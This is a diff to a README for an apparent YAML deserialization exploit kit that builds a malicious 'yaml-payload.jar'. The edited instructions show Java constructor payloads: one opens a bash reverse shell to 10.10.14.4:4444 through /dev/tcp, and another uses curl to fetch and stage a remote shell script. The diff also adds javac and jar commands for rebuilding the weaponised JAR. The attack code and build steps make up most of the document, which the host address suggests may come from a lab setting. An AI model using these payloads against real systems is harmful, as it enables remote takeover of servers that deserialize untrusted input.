@@ -16,9 +16,10 @@ Then place the 'yaml-payload.jar' file in to the web server folder (e.g. artsplo
 
 ## Additional Payload Examples
 
-The [AwesomeScriptEngineFactory.java](./src/artsploit/AwesomeScriptEngineFactory.java) file includes additional commented-out payload examples that you can use:
+The [AwesomeScriptEngineFactory.java](./src/artsploit/AwesomeScriptEngineFactory.java) file includes additional payload examples in the comments. To use them, replace the constructor in the file with one of the examples below and rebuild.
 
-### Reverse Shell Payloads
+### Example 1: Reverse Shell Payloads
+Replace the constructor with:
 ```java
 public AwesomeScriptEngineFactory() {
     String [] cmd={"bash","-c","bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"};
@@ -33,7 +34,8 @@ public AwesomeScriptEngineFactory() {
 }
 ```
 
-### Download and Execute Payloads
+### Example 2: Download and Execute Payloads
+Replace the constructor with this and add the `RunCmd` helper method to the class:
 ```java
 public AwesomeScriptEngineFactory() {
     RunCmd("curl 10.10.14.4/shell.sh -o /tmp/shell.sh");
@@ -50,4 +52,8 @@ public String RunCmd(String Cmd) {
 }
 ```
 
-Simply uncomment the desired payload in the source file and rebuild the JAR.
+After modifying the source file, rebuild the JAR:
+```bash
+javac src/artsploit/AwesomeScriptEngineFactory.java
+jar -cvf yaml-payload.jar -C src/ .
+```
